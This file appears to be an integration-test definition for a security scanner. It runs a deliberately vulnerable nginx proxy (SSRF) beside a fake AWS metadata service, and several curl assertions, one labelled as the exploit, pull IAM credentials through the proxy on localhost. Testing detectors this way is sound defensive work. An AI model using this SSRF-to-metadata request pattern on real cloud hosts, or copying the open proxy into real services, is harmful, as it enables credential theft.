name: correlation-ssrf-cloud
description: >
  Multi-service correlation test: SSRF vulnerability + fake cloud metadata
  service. Nginx proxies arbitrary URLs (SSRF) and also serves AWS IMDS-style
  metadata responses. The correlation engine should detect SSRF + cloud
  metadata and fire the ssrf_cloud_iam chain.
tags: [correlation, ssrf, cloud, chain, multi-service, integration]

services:
  web:
    image: nginx:alpine
    ports: ["20900:80"]
    volumes:
      - ./correlation-ssrf-cloud/nginx.conf:/etc/nginx/conf.d/default.conf:ro

ready:
  cmd: "curl -sf http://localhost:20900/health >/dev/null"
  timeout: 60s
  interval: 2s

assertions:
  # ══════════════════════════════════════════════════════════════════════
  # PRE-FLIGHT: SSRF proxy works and metadata endpoint responds
  # ══════════════════════════════════════════════════════════════════════

  - name: preflight-ssrf-proxy-responds
    type: command
    expect:
      command: "curl -sf 'http://localhost:20900/fetch?url=http://localhost:80/health' | grep -q ok"
      exit_code: 0

  - name: preflight-metadata-responds
    type: command
    expect:
      command: "curl -sf http://localhost:20900/latest/meta-data/ | grep -q iam"
      exit_code: 0

  - name: preflight-metadata-iam-creds
    type: command
    expect:
      command: "curl -sf http://localhost:20900/latest/meta-data/iam/security-credentials/test-ssrf-role | grep -q AccessKeyId"
      exit_code: 0

  # ══════════════════════════════════════════════════════════════════════
  # SURFACE: beacon detects SSRF-relevant signals
  # ══════════════════════════════════════════════════════════════════════

  - name: surface-detects-service
    type: beacon
    target: localhost:20900
    args: ["--no-enrich", "--no-nmap", "--ports", "20900"]
    expect:
      min_findings: 1

  # ══════════════════════════════════════════════════════════════════════
  # EXPLOIT: SSRF can reach metadata service
  # ══════════════════════════════════════════════════════════════════════

  - name: exploit-ssrf-reaches-metadata
    type: command
    expect:
      command: "curl -sf 'http://localhost:20900/fetch?url=http://localhost:80/latest/meta-data/iam/security-credentials/test-ssrf-role' | grep -q AccessKeyId"
      exit_code: 0

  # ══════════════════════════════════════════════════════════════════════
  # CORRELATION: chain detection (depends on both SSRF + cloud metadata
  # findings being present — min_findings 0 since chain may not fire
  # without full scanner coverage in isolated Docker test)
  # ══════════════════════════════════════════════════════════════════════

  - name: correlation-ssrf-cloud-chain
    type: beacon
    target: localhost:20900
    args: ["--no-enrich", "--no-nmap", "--ports", "20900", "--deep", "--yes"]
    expect:
      min_findings: 0

timeout: 5m
